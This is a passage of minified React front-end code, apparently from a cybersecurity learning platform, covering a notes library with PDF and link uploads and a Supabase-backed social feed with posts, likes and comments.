N&&S()&&R?e.jsx(N2,{onSave:B=>{i([B,...s]),k(!1)},onCancel:()=>k(!1)}):F&&R?e.jsx(k2,{onSave:B=>{c([B,...o]),T(!1)},onCancel:()=>T(!1)}):e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-8",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Field ",e.jsx("span",{className:"text-[#00FF88]",children:"Notes"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"OPERATIONAL INTELLIGENCE"})]}),e.jsxs("div",{className:"flex items-center gap-4",children:[a==="official"&&S()&&e.jsxs("button",{onClick:()=>k(!0),className:"flex items-center space-x-2 bg-[#00FF88] text-black px-4 py-2 rounded-lg hover:bg-[#00CC66] transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold text-sm",children:[e.jsx(cd,{className:"h-4 w-4"}),e.jsx("span",{children:"UPLOAD INTEL"})]}),a==="personal"&&e.jsxs("button",{onClick:()=>T(!0),className:"flex items-center space-x-2 bg-[#00FF88] text-black px-4 py-2 rounded-lg hover:bg-[#00CC66] transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold text-sm",children:[e.jsx(cd,{className:"h-4 w-4"}),e.jsx("span",{children:"ADD LOG"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(Mt,{className:"h-5 w-5 text-[#00FF88]"})})]})]}),e.jsxs("div",{className:"flex space-x-4 border-b border-[#00FF88]/10",children:[e.jsx("button",{onClick:()=>n("official"),className:`pb-3 px-4 text-sm font-bold uppercase tracking-wider transition-colors border-b-2 ${a==="official"?"border-[#00FF88] text-[#00FF88]":"border-transparent text-[#EAEAEA]/50 hover:text-[#EAEAEA]"}`,children:"Official Intel"}),e.jsx("button",{onClick:()=>n("personal"),className:`pb-3 px-4 text-sm font-bold uppercase tracking-wider transition-colors border-b-2 ${a==="personal"?"border-[#00FF88] text-[#00FF88]":"border-transparent text-[#EAEAEA]/50 hover:text-[#EAEAEA]"}`,children:"Personal Logs"})]}),a==="official"?e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 p-6",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{className:"relative group",children:[e.jsx(Dr,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-[#00B37A] group-focus-within:text-[#00FF88] transition-colors"}),e.jsx("input",{type:"text",placeholder:"SEARCH DATABASE...",value:f,onChange:B=>x(B.target.value),className:"w-full pl-10 pr-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] placeholder-[#00B37A]/50 font-mono text-sm transition-all"})]}),e.jsxs("div",{className:"relative",children:[e.jsx(od,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-[#00B37A]"}),e.jsxs("select",{value:p,onChange:B=>b(B.target.value),className:"w-full pl-10 pr-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] appearance-none font-mono text-sm cursor-pointer hover:border-[#00FF88]/40 transition-colors",children:[e.jsx("option",{value:"all",children:"ALL MISSIONS"}),V.map(B=>e.jsx("option",{value:B,children:B.replace("-"," ").replace(/\b\w/g,ae=>ae.toUpperCase())},B))]})]})]})}),w?e.jsxs("div",{className:"text-center py-12",children:[e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-[#00FF88] mx-auto mb-4"}),e.jsx("p",{className:"text-[#00B37A] font-mono animate-pulse",children:"DECRYPTING FILES..."})]}):d.length===0?e.jsxs("div",{className:"text-center py-20 border border-dashed border-[#00FF88]/20 rounded-xl bg-[#0A0F0A]/50",children:[e.jsx("div",{className:"text-[#00FF88]/20 mb-6",children:e.jsx(Mt,{className:"h-16 w-16 mx-auto"})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-2 uppercase tracking-widest",children:"No Files Found"}),e.jsx("p",{className:"text-[#00B37A]",children:f||p!=="all"?"Adjust search parameters to locate files.":"Intelligence database is currently empty."})]}):e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:d.map(B=>e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden hover:border-[#00FF88]/30 transition-all duration-300 group relative",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"p-6 relative",children:[e.jsx("div",{className:"flex items-start justify-between mb-4",children:e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-2",children:[e.jsx("div",{className:"p-2 rounded bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(Mt,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsx("h3",{className:"font-bold text-white group-hover:text-[#00FF88] transition-colors line-clamp-1 text-lg tracking-tight",children:B.title})]}),e.jsx("p",{className:"text-[#00B37A] text-sm mb-4 line-clamp-2 leading-relaxed",children:B.description})]})}),e.jsxs("div",{className:"flex items-center justify-between text-xs text-[#EAEAEA]/50 font-mono mb-6 border-t border-[#00FF88]/10 pt-4",children:[e.jsx("span",{className:"bg-[#00FF88]/10 text-[#00FF88] px-2 py-1 rounded border border-[#00FF88]/20 uppercase tracking-wider",children:B.course_id.replace("-"," ").replace(/\b\w/g,ae=>ae.toUpperCase())}),e.jsx("span",{children:new Date(B.created_at).toLocaleDateString()})]}),e.jsxs("button",{onClick:()=>G(B.pdf_url),className:"w-full flex items-center justify-center space-x-2 bg-[#00FF88] text-black py-3 rounded-lg hover:bg-[#00CC66] transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold uppercase tracking-wide",children:[e.jsx(Us,{className:"h-4 w-4"}),e.jsx("span",{children:"ACCESS FILE"})]})]})]},B.id))})]}):e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:o.length===0?e.jsxs("div",{className:"col-span-full text-center py-20 border border-dashed border-[#00FF88]/20 rounded-xl bg-[#0A0F0A]/50",children:[e.jsx("div",{className:"text-[#00FF88]/20 mb-6",children:e.jsx(Mt,{className:"h-16 w-16 mx-auto"})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-2 uppercase tracking-widest",children:"No Personal Logs"}),e.jsx("p",{className:"text-[#00B37A]",children:"Upload PDFs or add external links to track your own intelligence."})]}):o.map(B=>e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden hover:border-[#00FF88]/30 transition-all duration-300 group relative",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"p-6 relative",children:[e.jsxs("div",{className:"flex items-start justify-between mb-4",children:[e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-2",children:[e.jsx("div",{className:"p-2 rounded bg-[#00FF88]/10 border border-[#00FF88]/20",children:B.type==="pdf"?e.jsx(Mt,{className:"h-5 w-5 text-[#00FF88]"}):e.jsx(F0,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsx("h3",{className:"font-bold text-white group-hover:text-[#00FF88] transition-colors line-clamp-1 text-lg tracking-tight",children:B.title})]}),e.jsx("p",{className:"text-[#00B37A] text-xs font-mono mb-4",children:B.type==="pdf"?"ENCRYPTED PDF DOCUMENT":"EXTERNAL INTELLIGENCE LINK"})]}),e.jsx("button",{onClick:()=>O(B.id),className:"text-red-500/50 hover:text-red-500 transition-colors",children:e.jsx(Ad,{className:"h-4 w-4"})})]}),e.jsxs("div",{className:"flex items-center justify-between text-xs text-[#EAEAEA]/50 font-mono mb-6 border-t border-[#00FF88]/10 pt-4",children:[e.jsx("span",{className:"bg-[#00FF88]/10 text-[#00FF88] px-2 py-1 rounded border border-[#00FF88]/20 uppercase tracking-wider",children:B.type.toUpperCase()}),e.jsx("span",{children:new Date(B.created_at).toLocaleDateString()})]}),e.jsxs("button",{onClick:()=>G(B.content_url),className:"w-full flex items-center justify-center space-x-2 bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20 py-3 rounded-lg hover:bg-[#00FF88]/20 transition-all font-bold uppercase tracking-wide",children:[B.type==="pdf"?e.jsx(Us,{className:"h-4 w-4"}):e.jsx(Ao,{className:"h-4 w-4"}),e.jsx("span",{children:B.type==="pdf"?"ACCESS FILE":"OPEN LINK"})]})]})]},B.id))}),e.jsxs("div",{className:"mt-8 bg-[#0A0F0A] border border-[#00FF88]/10 rounded-xl p-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(0,255,136,0.02)_50%,transparent_75%,transparent_100%)] bg-[length:250%_250%,100%_100%] animate-[shimmer_3s_infinite]"}),e.jsxs("div",{className:"relative z-10",children:[e.jsxs("h3",{className:"font-bold text-white mb-4 flex items-center gap-2",children:[e.jsx(xr,{className:"h-4 w-4 text-[#00FF88]"}),"Field Manual Access"]}),e.jsxs("div",{className:"text-[#00B37A] space-y-2 text-sm font-mono",children:[e.jsx("p",{children:" Classified documentation for all operational modules."}),e.jsx("p",{children:" Compiled by senior field operatives."}),e.jsx("p",{children:" Authorized for offline review and mission planning."}),e.jsx("p",{children:" Synchronized with latest threat intelligence."})]})]})]})]})})},N2=({onSave:a,onCancel:n})=>{const[s,i]=v.useState({title:"",description:"",module_id:"",course_id:""}),[o,c]=v.useState(null),[d,m]=v.useState(!1),{user:f}=Ie(),x=b=>{const w=b.target.files?.[0];w&&w.type==="application/pdf"?c(w):alert("Please select a PDF file")},p=async b=>{if(b.preventDefault(),!o){alert("Please select a PDF file");return}try{m(!0);const w=await ps.uploadFile(o,"notes"),j=await ps.createNote({...s,pdf_url:w,admin_id:f.id});a(j)}catch(w){console.error("Upload failed:",w),alert("Failed to upload note")}finally{m(!1)}};return e.jsx("div",{className:"p-6 min-h-screen bg-black text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-2xl mx-auto",children:[e.jsxs("div",{className:"flex items-center justify-between mb-8 border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Upload ",e.jsx("span",{className:"text-[#00FF88]",children:"Intel"})]}),e.jsx("button",{onClick:n,className:"text-[#00B37A] hover:text-white transition-colors font-mono uppercase tracking-wider text-sm",children:"Abort"})]}),e.jsxs("form",{onSubmit:p,className:"bg-[#0A0F0A] border border-[#00FF88]/10 rounded-xl p-8 space-y-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-[#00FF88]/5 to-transparent pointer-events-none"}),e.jsxs("div",{className:"relative z-10 space-y-6",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"File Designation"}),e.jsx("input",{type:"text",value:s.title,onChange:b=>i(w=>({...w,title:b.target.value})),className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] font-mono text-sm",placeholder:"e.g., SQL INJECTION PROTOCOLS",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Content Summary"}),e.jsx("textarea",{value:s.description,onChange:b=>i(w=>({...w,description:b.target.value})),rows:3,className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] font-mono text-sm",placeholder:"Brief intelligence summary...",required:!0})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Course ID"}),e.jsx("input",{type:"text",value:s.course_id,onChange:b=>i(w=>({...w,course_id:b.target.value})),className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] font-mono text-sm",placeholder:"e.g., owasp-top-10",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Module ID"}),e.jsx("input",{type:"text",value:s.module_id,onChange:b=>i(w=>({...w,module_id:b.target.value})),className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] font-mono text-sm",placeholder:"e.g., module-1",required:!0})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Encrypted Payload (PDF)"}),e.jsx("input",{type:"file",onChange:x,accept:".pdf",className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-[#00FF88]/10 file:text-[#00FF88] hover:file:bg-[#00FF88]/20 font-mono text-sm",required:!0}),o&&e.jsxs("p",{className:"text-xs text-[#00FF88] mt-2 font-mono",children:["SELECTED: ",o.name]})]}),e.jsxs("div",{className:"flex justify-end space-x-4 pt-4 border-t border-[#00FF88]/10",children:[e.jsx("button",{type:"button",onClick:n,className:"px-6 py-2 border border-[#00FF88]/20 text-[#00B37A] rounded-lg hover:bg-[#00FF88]/5 transition-colors font-mono uppercase tracking-wider text-sm",children:"Cancel"}),e.jsx("button",{type:"submit",disabled:d,className:"px-6 py-2 bg-[#00FF88] text-black rounded-lg hover:bg-[#00CC66] disabled:opacity-50 transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold uppercase tracking-wide flex items-center space-x-2",children:d?e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"animate-spin rounded-full h-4 w-4 border-b-2 border-black"}),e.jsx("span",{children:"ENCRYPTING..."})]}):e.jsxs(e.Fragment,{children:[e.jsx(Ed,{className:"h-4 w-4"}),e.jsx("span",{children:"UPLOAD"})]})})]})]})]})]})})},k2=({onSave:a,onCancel:n})=>{const[s,i]=v.useState({title:"",type:"link",content_url:""}),[o,c]=v.useState(null),[d,m]=v.useState(!1),{user:f}=Ie(),x=b=>{const w=b.target.files?.[0];w&&w.type==="application/pdf"?c(w):alert("Please select a PDF file")},p=async b=>{if(b.preventDefault(),!!f){if(s.type==="pdf"&&!o){alert("Please select a PDF file");return}if(s.type==="link"&&!s.content_url){alert("Please enter a valid URL");return}try{m(!0);let w=s.content_url;s.type==="pdf"&&o&&(w=await Ln.uploadPersonalFile(o));const j=await Ln.addPersonalNote({user_id:f.id,title:s.title,type:s.type,content_url:w});a(j)}catch(w){console.error("Upload failed:",w),alert("Failed to save log")}finally{m(!1)}}};return e.jsx("div",{className:"p-6 min-h-screen bg-black text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-2xl mx-auto",children:[e.jsxs("div",{className:"flex items-center justify-between mb-8 border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Add Personal ",e.jsx("span",{className:"text-[#00FF88]",children:"Log"})]}),e.jsx("button",{onClick:n,className:"text-[#00B37A] hover:text-white transition-colors font-mono uppercase tracking-wider text-sm",children:"Abort"})]}),e.jsxs("form",{onSubmit:p,className:"bg-[#0A0F0A] border border-[#00FF88]/10 rounded-xl p-8 space-y-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-[#00FF88]/5 to-transparent pointer-events-none"}),e.jsxs("div",{className:"relative z-10 space-y-6",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Log Title"}),e.jsx("input",{type:"text",value:s.title,onChange:b=>i(w=>({...w,title:b.target.value})),className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] font-mono text-sm",placeholder:"e.g., MY RESEARCH NOTES",required:!0})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Log Type"}),e.jsxs("div",{className:"flex space-x-4",children:[e.jsx("button",{type:"button",onClick:()=>i(b=>({...b,type:"link"})),className:`flex-1 py-3 rounded-lg border font-mono uppercase tracking-wider text-sm transition-all ${s.type==="link"?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88]":"bg-black border-[#00FF88]/20 text-[#00B37A] hover:border-[#00FF88]/50"}`,children:"External Link"}),e.jsx("button",{type:"button",onClick:()=>i(b=>({...b,type:"pdf"})),className:`flex-1 py-3 rounded-lg border font-mono uppercase tracking-wider text-sm transition-all ${s.type==="pdf"?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88]":"bg-black border-[#00FF88]/20 text-[#00B37A] hover:border-[#00FF88]/50"}`,children:"PDF Document"})]})]}),s.type==="link"?e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"External URL"}),e.jsx("input",{type:"url",value:s.content_url,onChange:b=>i(w=>({...w,content_url:b.target.value})),className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] font-mono text-sm",placeholder:"https://drive.google.com/...",required:!0})]}):e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-2",children:"Upload PDF"}),e.jsx("input",{type:"file",onChange:x,accept:".pdf",className:"w-full px-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-[#00FF88]/10 file:text-[#00FF88] hover:file:bg-[#00FF88]/20 font-mono text-sm",required:!0}),o&&e.jsxs("p",{className:"text-xs text-[#00FF88] mt-2 font-mono",children:["SELECTED: ",o.name]})]}),e.jsxs("div",{className:"flex justify-end space-x-4 pt-4 border-t border-[#00FF88]/10",children:[e.jsx("button",{type:"button",onClick:n,className:"px-6 py-2 border border-[#00FF88]/20 text-[#00B37A] rounded-lg hover:bg-[#00FF88]/5 transition-colors font-mono uppercase tracking-wider text-sm",children:"Cancel"}),e.jsx("button",{type:"submit",disabled:d,className:"px-6 py-2 bg-[#00FF88] text-black rounded-lg hover:bg-[#00CC66] disabled:opacity-50 transition-all shadow-[0_0_20px_rgba(0,255,136,0.3)] font-bold uppercase tracking-wide flex items-center space-x-2",children:d?e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"animate-spin rounded-full h-4 w-4 border-b-2 border-black"}),e.jsx("span",{children:"SAVING..."})]}):e.jsxs(e.Fragment,{children:[e.jsx(Ed,{className:"h-4 w-4"}),e.jsx("span",{children:"SAVE LOG"})]})})]})]})]})]})})},ls={async getPosts(){const{data:a,error:n}=await Z.from("posts").select("*").order("created_at",{ascending:!1});return n?(console.error("Error fetching posts:",n),[]):a.map(s=>({...s,timestamp:new Date(s.created_at).toLocaleString(),author:s.author||{name:"Anonymous",role:"Student"},shares:s.shares||0}))},async createPost(a){const{data:n,error:s}=await Z.from("posts").insert([{...a,likes:0,comments:0,shares:0,created_at:new Date().toISOString()}]).select().single();if(s)throw console.error("Error creating post:",s),s;return{...n,timestamp:"Just now",author:n.author||a.author}},subscribeToPosts(a){return Z.channel("public:posts").on("postgres_changes",{event:"*",schema:"public",table:"posts"},a).subscribe()},async likePost(a){const{data:n,error:s}=await Z.from("posts").select("likes").eq("id",a).single();if(s)return;const{error:i}=await Z.from("posts").update({likes:(n?.likes||0)+1}).eq("id",a);i&&console.error("Error liking post:",i)},async sharePost(a){const{data:n,error:s}=await Z.from("posts").select("shares").eq("id",a).single();if(s)return;const{error:i}=await Z.from("posts").update({shares:(n?.shares||0)+1}).eq("id",a);i&&console.error("Error sharing post:",i)},async getComments(a){const{data:n,error:s}=await Z.from("comments").select("*").eq("post_id",a).order("created_at",{ascending:!0});return s?(console.error("Error fetching comments:",s),[]):n.map(i=>({...i,timestamp:new Date(i.created_at).toLocaleString()}))},async createComment(a){const{data:n,error:s}=await Z.from("comments").insert([{...a,created_at:new Date().toISOString()}]).select().single();if(s)throw console.error("Error creating comment:",s),s;const{data:i}=await Z.from("posts").select("comments").eq("id",a.post_id).single();return i&&await Z.from("posts").update({comments:(i.comments||0)+1}).eq("id",a.post_id),{...n,timestamp:"Just now"}},subscribeToComments(a){return Z.channel("public:comments").on("postgres_changes",{event:"INSERT",schema:"public",table:"comments"},a).subscribe()}},F2=({onBack:a})=>{const{user:n}=Ie(),[s,i]=v.useState("all"),[o,c]=v.useState(""),[d,m]=v.useState(""),[f,x]=v.useState([]),[p,b]=v.useState(!0),[w,j]=v.useState(null),[N,k]=v.useState(""),[F,T]=v.useState({});v.useEffect(()=>{R();const V=ls.subscribeToPosts(ae=>{if(ae.new){const xe=ae.new,ye={...xe,timestamp:"Just now",author:xe.author||{name:"Anonymous",role:"Student"},tags:xe.tags||[],likes:xe.likes||0,comments:xe.comments||0,shares:xe.shares||0};x(ne=>[ye,...ne])}}),B=ls.subscribeToComments(ae=>{if(ae.new){const xe=ae.new;T(ye=>{const ne=ye[xe.post_id]||[];return ne.some(fe=>fe.id===xe.id)?ye:{...ye,[xe.post_id]:[...ne,{...xe,timestamp:"Just now"}]}}),x(ye=>ye.map(ne=>ne.id===xe.post_id?{...ne,comments:ne.comments+1}:ne))}});return()=>{V.unsubscribe(),B.unsubscribe()}},[]);const R=async()=>{b(!0);const V=await ls.getPosts();x(V),b(!1)},S=async V=>{if(V.preventDefault(),!!d.trim())try{const B={author:{name:n?.name||"Anonymous",role:"Student"},content:d,tags:["General"],category:"social"};await ls.createPost(B),m("")}catch(B){console.error("Failed to create post:",B)}},U=async V=>{x(B=>B.map(ae=>ae.id===V?{...ae,likes:ae.likes+1}:ae)),await ls.likePost(V)},z=async V=>{x(B=>B.map(ae=>ae.id===V?{...ae,shares:(ae.shares||0)+1}:ae)),await ls.sharePost(V)},H=async V=>{if(w===V)j(null);else if(j(V),!F[V]){const B=await ls.getComments(V);T(ae=>({...ae,[V]:B}))}},G=async(V,B)=>{if(V.preventDefault(),!!N.trim())try{const ae={post_id:B,author:{name:n?.name||"Anonymous",role:"Student"},content:N},xe=await ls.createComment(ae);T(ye=>({...ye,[B]:[...ye[B]||[],xe]})),x(ye=>ye.map(ne=>ne.id===B?{...ne,comments:ne.comments+1}:ne)),k("")}catch(ae){console.error("Failed to create comment:",ae)}},O=f.filter(V=>{const B=s==="all"||V.category===s,ae=V.content.toLowerCase().includes(o.toLowerCase())||V.author.name.toLowerCase().includes(o.toLowerCase())||V.tags.some(xe=>xe.toLowerCase().includes(o.toLowerCase()));return B&&ae});return e.jsxs("div",{className:"min-h-screen bg-[#000000] text-[#EAEAEA] font-sans selection:bg-[#00FF88]/30",children:[e.jsx("div",{className:"fixed inset-0 bg-[linear-gradient(to_right,#00FF8808_1px,transparent_1px),linear-gradient(to_bottom,#00FF8808_1px,transparent_1px)] bg-[size:24px_24px] pointer-events-none"}),e.jsx("div",{className:"fixed top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-[#00FF88]/10 blur-[120px] rounded-full pointer-events-none"}),e.jsxs("div",{className:"relative z-10 max-w-7xl mx-auto px-6 py-8",children:[e.jsxs("div",{className:"flex flex-col md:flex-row md:items-center justify-between mb-12 gap-6",children:[e.jsxs("div",{children:[e.jsxs("button",{onClick:()=>{a?a():window.location.href="/?tab=landing"},className:"group flex items-center text-[#00B37A] hover:text-[#00FF88] transition-colors mb-6 text-sm font-medium tracking-wide uppercase",children:[e.jsx(ys,{className:"h-4 w-4 mr-2 group-hover:-translate-x-1 transition-transform"}),"Return to Base"]}),e.jsxs("h1",{className:"text-5xl font-black tracking-tight text-white mb-2",children:["NET",e.jsx("span",{className:"text-[#00FF88]",children:"WORK"})]}),e.jsx("p",{className:"text-[#00B37A] text-lg max-w-xl",children:"Global cybersecurity intelligence feed. Share intel, exploits, and discussions."})]}),e.jsxs("div",{className:"relative group w-full md:w-96",children:[e.jsx("div",{className:"absolute -inset-0.5 bg-gradient-to-r from-[#00FF88] to-[#00CC66] rounded-lg blur opacity-20 group-hover:opacity-60 transition duration-500"}),e.jsxs("div",{className:"relative flex items-center bg-[#0A0F0A] rounded-lg p-1 border border-[#00FF88]/20",children:[e.jsx(Dr,{className:"h-5 w-5 text-[#00B37A] ml-3"}),e.jsx("input",{type:"text",value:o,onChange:V=>c(V.target.value),placeholder:"Search the network...",className:"w-full bg-transparent border-none focus:ring-0 text-[#EAEAEA] placeholder:text-[#00B37A]/50 h-10"})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-12 gap-8",children:[e.jsx("div",{className:"lg:col-span-3 space-y-8",children:e.jsxs("div",{className:"sticky top-24 space-y-8",children:[e.jsxs("div",{className:"space-y-2",children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest px-3 mb-4",children:"Signal Filter"}),e.jsx(Vc,{active:s==="all",onClick:()=>i("all"),label:"All Signals",icon:e.jsx(za,{className:"h-4 w-4"})}),e.jsx(Vc,{active:s==="technical",onClick:()=>i("technical"),label:"Technical Intel",icon:e.jsx(ey,{className:"h-4 w-4"})}),e.jsx(Vc,{active:s==="social",onClick:()=>i("social"),label:"Social Comms",icon:e.jsx(Sm,{className:"h-4 w-4"})})]}),e.jsxs("div",{children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest px-3 mb-4",children:"Trending Tags"}),e.jsx("div",{className:"flex flex-wrap gap-2 px-2",children:["#ZeroDay","#RedTeam","#CTF","#Malware","#OpSec"].map(V=>e.jsx("span",{className:"text-xs font-mono text-[#00FF88] bg-[#00FF88]/10 border border-[#00FF88]/20 px-3 py-1.5 rounded cursor-pointer hover:bg-[#00FF88]/20 transition-colors",children:V},V))})]})]})}),e.jsxs("div",{className:"lg:col-span-9 space-y-6",children:[e.jsxs("div",{className:"relative group",children:[e.jsx("div",{className:"absolute -inset-0.5 bg-gradient-to-r from-[#00FF88] to-[#00CC66] rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-500"}),e.jsx("div",{className:"relative bg-[#0A0F0A] rounded-xl p-6 border border-[#00FF88]/20",children:e.jsx("form",{onSubmit:S,children:e.jsxs("div",{className:"flex gap-4",children:[e.jsx("div",{className:"w-12 h-12 rounded bg-[#0A0F0A] flex items-center justify-center flex-shrink-0 border border-[#00FF88]/30",children:e.jsx(zt,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsxs("div",{className:"flex-1 space-y-4",children:[e.jsx("textarea",{value:d,onChange:V=>m(V.target.value),placeholder:"Broadcast your status...",className:"w-full bg-[#000000]/50 border border-[#00FF88]/20 rounded-lg p-4 text-[#EAEAEA] placeholder:text-[#00B37A]/50 focus:border-[#00FF88] focus:ring-1 focus:ring-[#00FF88] transition-all resize-none h-32 font-mono text-sm"}),e.jsx("div",{className:"flex justify-end",children:e.jsxs("button",{type:"submit",disabled:!d.trim(),className:"flex items-center gap-2 px-6 py-2.5 bg-[#00FF88] hover:bg-[#00CC66] text-black rounded-lg font-bold tracking-wide transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_0_15px_rgba(0,255,136,0.3)]",children:[e.jsx(A0,{className:"h-4 w-4"}),"BROADCAST"]})})]})]})})})]}),e.jsx("div",{className:"space-y-4",children:p?e.jsxs("div",{className:"flex flex-col items-center justify-center py-20 text-[#00B37A]",children:[e.jsx("div",{className:"w-12 h-12 border-4 border-[#0A0F0A] border-t-[#00FF88] rounded-full animate-spin mb-4"}),e.jsx("p",{className:"font-mono text-sm animate-pulse",children:"ESTABLISHING UPLINK..."})]}):O.length===0?e.jsx("div",{className:"text-center py-20 bg-[#0A0F0A]/50 rounded-xl border border-[#00FF88]/20 border-dashed",children:e.jsx("p",{className:"text-[#00B37A] font-mono",children:"NO SIGNALS DETECTED"})}):O.map(V=>e.jsxs("div",{className:"group bg-[#0A0F0A] hover:bg-[#0A0F0A]/80 border border-[#00FF88]/10 hover:border-[#00FF88]/30 rounded-xl p-6 transition-all duration-300",children:[e.jsxs("div",{className:"flex justify-between items-start mb-4",children:[e.jsxs("div",{className:"flex items-center gap-4",children:[e.jsx("div",{className:"w-10 h-10 rounded bg-gradient-to-br from-[#0A0F0A] to-[#000000] flex items-center justify-center border border-[#00FF88]/20",children:e.jsx("span",{className:"font-bold text-[#00FF88] 